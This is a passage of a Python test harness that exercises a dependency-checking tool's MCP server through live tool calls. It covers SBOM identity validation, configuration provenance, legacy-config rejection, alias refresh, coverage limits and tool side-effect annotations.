    passed.append("external-sbom-preserves-purl-identity-dimensions")

    (snapshots / "bad-bom.json").write_text(
        json.dumps(
            {
                "bomFormat": "CycloneDX",
                "specVersion": "1.7",
                "metadata": {"component": {"bom-ref": "same", "name": "app"}},
                "components": [{"bom-ref": "same", "name": "library"}],
            }
        )
    )
    invalid_arguments = {
        "project_root": str(root / "python"),
        "sbom_file": ".tmp/bad-bom.json",
    }
    rejected = await session.call_tool("inspect_dependency_sbom", invalid_arguments)
    check(
        rejected.isError is True
        and "application reference" in rejected.content[0].text,
        "Invalid SBOM application identity was accepted",
    )
    calls.append(
        {
            "name": "inspect_dependency_sbom",
            "arguments": invalid_arguments,
            "result": {"is_error": True, "message": rejected.content[0].text},
        }
    )
    passed.append("external-sbom-rejects-conflicting-identity")


async def _check_configuration_and_coverage(root, call, passed, session, calls):
    await call("scan_repository", "python-tasks")
    task = await call(
        "explain_dependency",
        "python-tasks",
        package="ruff",
        ecosystem="PyPI",
        project_id="pypi:python:.",
    )
    check(
        len(task["declarations"]) == 2
        and any(d["kind"] == "environment" for d in task["declarations"])
        and any(u["kind"] == "environment-command" for u in task["usages"])
        and any(f["code"] == "dependency.unused" for f in task["findings"])
        and not task["evidence_complete"],
        "Hatch environment usage leaked into application hygiene or lost uncertainty",
    )
    passed.append("hatch-task-environment-boundary-through-index-query")
    await call("scan_repository", "configuration")
    configured = await call(
        "explain_dependency",
        "configuration",
        package="@types/node",
        ecosystem="npm",
    )
    check(
        not configured["imports"]
        and configured["usages"][0]["kind"] == "configuration",
        "TypeScript configuration became a source import",
    )
    passed.append("static-configuration-provenance")

    named = await call("scan_repository", "named-components")
    check(
        {p["project_id"] for p in named["projects"]}
        == {"pypi:python:a", "pypi:python:b"},
        "Named Python ownership was lost",
    )
    named_cache = root / "named-components/.depcheck/index.sqlite3"
    named_before = named_cache.read_bytes()
    legacy_config = root / "named-components/.depcheck.toml"
    legacy_config.write_text(
        '[[tool-usage]]\necosystem="PyPI"\nproject-id="pypi:python:."\n'
        'package="pyyaml"\nscope="test"\nreason="Legacy plugin configuration"\n'
    )
    invalid_arguments = {"project_root": str(root / "named-components")}
    rejected = await session.call_tool("scan_repository", invalid_arguments)
    check(
        rejected.isError is True
        and "pypi:python:a" in rejected.content[0].text
        and "pypi:python:b" in rejected.content[0].text,
        "Legacy configuration did not provide component migration guidance",
    )
    check(
        named_cache.read_bytes() == named_before,
        "Failed migration changed cache",
    )
    calls.append(
        {
            "name": "scan_repository",
            "arguments": invalid_arguments,
            "result": {"is_error": True, "message": rejected.content[0].text},
        }
    )
    legacy_config.unlink()
    passed.append("legacy-component-scope-rejected-without-cache-mutation")
    handoff = await call(
        "plan_dependency_updates",
        "named-components",
        updates={"pyyaml": "6.0.3"},
        project_id="pypi:python:a",
        target_file="a/pyproject.toml",
        group="project",
    )
    check(
        handoff["handoff"]["status"] == "ready"
        and all(v["status"] == "not-run" for v in handoff["handoff"]["verification"]),
        "Maintenance handoff invented validation",
    )
    passed.append("component-scoped-maintenance-handoff")

    await call("scan_repository", "alias-known")
    known = await call(
        "explain_dependency",
        "alias-known",
        package="lodash",
        ecosystem="npm",
        project_id="npm:npm:.",
    )
    check(
        known["usages"][0]["mapping_confidence"] == "exact",
        "Known alias not exact",
    )
    original_alias = (root / "alias-known" / "package.json").read_text()
    (root / "alias-known" / "package.json").write_text(
        original_alias.replace("lodash/fp", "other")
    )
    check(
        (await call("repository_context", "alias-known"))["stale"],
        "Alias change did not invalidate index",
    )
    await call("index_repository", "alias-known")
    changed_alias = await call(
        "explain_dependency",
        "alias-known",
        package="other",
        ecosystem="npm",
        project_id="npm:npm:.",
    )
    check(
        changed_alias["usages"][0]["reference"] == "#alias",
        "Alias refresh lost usage",
    )
    passed.append("known-alias-and-refresh")
    for fixture in ("dynamic", "alias"):
        partial = await call("scan_repository", fixture)
        check(
            partial["capabilities"]["dependency_hygiene"]["state"] == "incomplete",
            f"{fixture} lost its coverage limitation",
        )
        check(
            not any(f["code"] == "dependency.unused" for f in partial["findings"]),
            f"{fixture} asserted an unsupported unused dependency",
        )
        check(
            not partial["context"]["stale"],
            "Fresh partial evidence marked stale",
        )
        passed.append(f"{fixture}-usage-incomplete")


async def exercise(root: Path, calls: list[dict], passed: list[str]) -> None:
    fixtures = _prepare_fixtures(root)
    params = StdioServerParameters(
        command=sys.executable,
        args=["-m", "depcheck.agent.mcp_server", "--allow-root", str(root)],
    )
    async with stdio_client(params) as (read, write):
        async with ClientSession(read, write) as session:
            await session.initialize()
            identity = await session.call_tool("backend_info", {})
            check(not identity.isError, f"backend_info: {identity.content}")
            identity_payload = json.loads(identity.content[0].text)
            calls.append(
                {"name": "backend_info", "arguments": {}, "result": identity_payload}
            )
            check(
                identity_payload["index_schema"] == "depcheck.index.v8",
                "Unexpected backend index schema",
            )
            passed.append("backend_identity")
            definitions = await session.list_tools()
            for tool in definitions.tools:
                check(
                    tool.annotations is not None, f"Missing annotations for {tool.name}"
                )
                check(
                    tool.annotations.openWorldHint
                    is (tool.name == "verify_registry_package"),
                    "Unexpected network annotation",
                )
                check(
                    tool.annotations.readOnlyHint
                    == (tool.name not in {"index_repository", "scan_repository"}),
                    f"Incorrect side effects for {tool.name}",
                )

            async def call(name: str, fixture: str, **arguments) -> dict:
                arguments = {"project_root": str(root / fixture), **arguments}
                result = await session.call_tool(name, arguments)
                check(not result.isError, f"{name}: {result.content}")
                payload = json.loads(result.content[0].text)
                calls.append({"name": name, "arguments": arguments, "result": payload})
                return payload

            scan = await _check_manifest_assertions(root, call, passed)
            await _check_go_gradle_and_yarn(root, call, passed)
            await _check_queries_and_previews(root, call, passed, fixtures)
            await _check_build_configuration(root, call, passed)
            await _check_native_packages_and_ownership(root, call, passed)
            snapshots, index_original = await _check_snapshots_and_external_models(
                root, call, passed, scan
            )
            await _check_offline_security(root, call, passed, snapshots)
            await _check_external_exports(
                root, call, passed, snapshots, index_original, session, calls
            )
            await _check_configuration_and_coverage(root, call, passed, session, calls)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--output", type=Path, help="Write actual tool calls and results"
    )
    args = parser.parse_args()
    calls: list[dict] = []
    passed: list[str] = []
    result = {
        "kind": "live-mcp-contracts",
        "passed_scenarios": passed,
        "tool_calls": calls,
    }
    try:
        with TemporaryDirectory(prefix="depcheck-skill-") as directory:

            async def bounded():
                async with asyncio.timeout(60):
                    await exercise(Path(directory), calls, passed)

            asyncio.run(bounded())
    finally:
        if args.output:
            args.output.write_text(
                json.dumps(result, indent=2) + "\n", encoding="utf-8"
            )
    print(json.dumps({"passed_scenarios": passed, "tool_call_count": len(calls)}))


if __name__ == "__main__":
    main()
